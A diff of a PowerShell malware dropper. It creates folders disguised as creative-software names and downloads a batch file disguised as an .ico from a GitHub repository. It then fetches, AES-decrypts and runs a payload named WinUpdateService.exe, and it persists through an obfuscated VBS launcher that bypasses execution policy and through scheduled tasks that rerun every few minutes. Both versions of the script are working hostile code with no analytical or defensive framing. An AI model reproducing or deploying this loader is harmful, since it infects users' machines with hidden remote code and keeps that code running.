@@ -1,39 +1,16 @@
-$programs = @(
-    "PhotoshopProAM",
-    "IllustratorXAM",
-    "PremiereEditAM",
-    "AfterEffectsAM",
-    "Blender3DAM",
-    "Maya3DAM",
-    "ZBrushSculptAM",
-    "DaVinciResolveAM",
-    "CorelDrawXAM",
-    "Cinema4DAM",
-    "LightroomXAM"
-)
-$paths = @(
-    $env:AppData,
-    "C:\ProgramData"
-)
+$programs = @("PhotoshopProAM", "IllustratorXAM", "PremiereEditAM", "AfterEffectsAM", "Blender3DAM", "Maya3DAM", "ZBrushSculptAM", "DaVinciResolveAM", "CorelDrawXAM", "Cinema4DAM", "LightroomXAM")
+$paths = @("$env:AppData\", "C:\ProgramData\")
 $randomProgram = Get-Random -InputObject $programs
 $randomPath = Get-Random -InputObject $paths
-$fullPath = Join-Path -Path $randomPath -ChildPath $randomProgram
-New-Item -Path $fullPath -ItemType Directory -Force | Out-Null
+$fullPath = "$randomPath$randomProgram"
+New-Item -Path $fullPath -ItemType Directory -Force
 
-$icoUrl1 = "https://github.com/ibrahem1012/WindowsExplorer/raw/main/upd.ico"
-$icoPath1 = Join-Path -Path $fullPath -ChildPath "updata.ico"
-Invoke-WebRequest -Uri $icoUrl1 -OutFile $icoPath1
-
-$batContent = @"
-@echo off
-start """" `"$icoPath1`"
-exit
-"@
-$batPath = Join-Path -Path $fullPath -ChildPath "run_ico.bat"
-Set-Content -Path $batPath -Value $batContent -Force
-
+$batUrl = "https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/upd.ico"
+$batPath = "$fullPath\upd.bat"
+Invoke-WebRequest -Uri $batUrl -OutFile $batPath
 Start-Process -FilePath $batPath -WindowStyle Hidden
 
+$scriptContent = @'
 function HexStringToByteArray([string]$hex) {
     $bytes = New-Object byte[] ($hex.Length / 2)
     for ($i = 0; $i -lt $bytes.Length; $i++) {
@@ -41,7 +18,6 @@ function HexStringToByteArray([string]$hex) {
     }
     return $bytes
 }
-
 function AES-Decrypt {
     param (
         [byte[]]$Data,
@@ -67,7 +43,6 @@ function AES-Decrypt {
         return $null
     }
 }
-
 $tempPath = "$env:TEMP\enc_payload.bin"
 Invoke-WebRequest -Uri "https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/encrypted_payload.bin" -OutFile $tempPath
 $encBytes = [System.IO.File]::ReadAllBytes($tempPath)
@@ -76,9 +51,8 @@ $ivHex = "0102030405060708090a0b0c0d0e0f10"
 $key = HexStringToByteArray $keyHex
 $iv = HexStringToByteArray $ivHex
 $decBytes = AES-Decrypt -Data $encBytes -Key $key -IV $iv
-
 if ($decBytes -ne $null) {
-    $outPath = Join-Path -Path $fullPath -ChildPath "WinUpdateService.exe"
+    $outPath = "$fullPath\WinUpdateService.exe"
     [System.IO.File]::WriteAllBytes($outPath, $decBytes)
     if (Test-Path $outPath) {
         Start-Process $outPath
@@ -86,36 +60,34 @@ if ($decBytes -ne $null) {
         Remove-Item $outPath -Force
     }
 }
-
 Remove-Item $tempPath -Force
+'@
 
-$vbsContent = @"
+Set-Content -Path "$fullPath\$randomProgram.ps1" -Value $scriptContent -Force
+
+$vbsContent = @'
 On Error Resume Next
-Dim shell
-Set shell = CreateObject(""WScript.Shell"")
-shell.Run ""`"$batPath`"", 0, False
-"@
-$vbsPath = Join-Path -Path $fullPath -ChildPath "$randomProgram.vbs"
-Set-Content -Path $vbsPath -Value $vbsContent -Force
+Dim arr, cmd
+arr = Split(""p,o,w,e,r,s,h,e,l,l"", "","")
+cmd = Join(arr, """") & "" -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """"$fullPath\$randomProgram.ps1""""
+CreateObject(""WScript.Shell"").Run cmd, 0, False
+'@
 
-$ps1Content = @"
-Start-Process -FilePath 'wscript.exe' -ArgumentList '`"$vbsPath`"' -WindowStyle Hidden
-"@
-$ps1Path = Join-Path -Path $fullPath -ChildPath "$randomProgram.ps1"
-Set-Content -Path $ps1Path -Value $ps1Content -Force
+Set-Content -Path "$fullPath\$randomProgram.vbs" -Value $vbsContent -Force
 
+Start-Sleep 2
 try {
-    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsPath`""
+    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument ""$fullPath\$randomProgram.vbs""
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
-    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $randomProgram -Force
+    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "$randomProgram"
 } catch {}
 
 Start-Sleep 2
-
 $taskName2 = "${randomProgram}Startup"
+$scriptPath = "$fullPath\$randomProgram.vbs"
 try {
-    schtasks /create /tn $taskName2 /tr "`"$batPath`"" /sc MINUTE /mo 45 /f
+    schtasks /create /tn "$taskName2" /tr $scriptPath /sc MINUTE /mo 45 /f
 } catch {}
 
 Start-Sleep 5
-schtasks /run /tn $randomProgram
+schtasks /run /tn "$randomProgram"
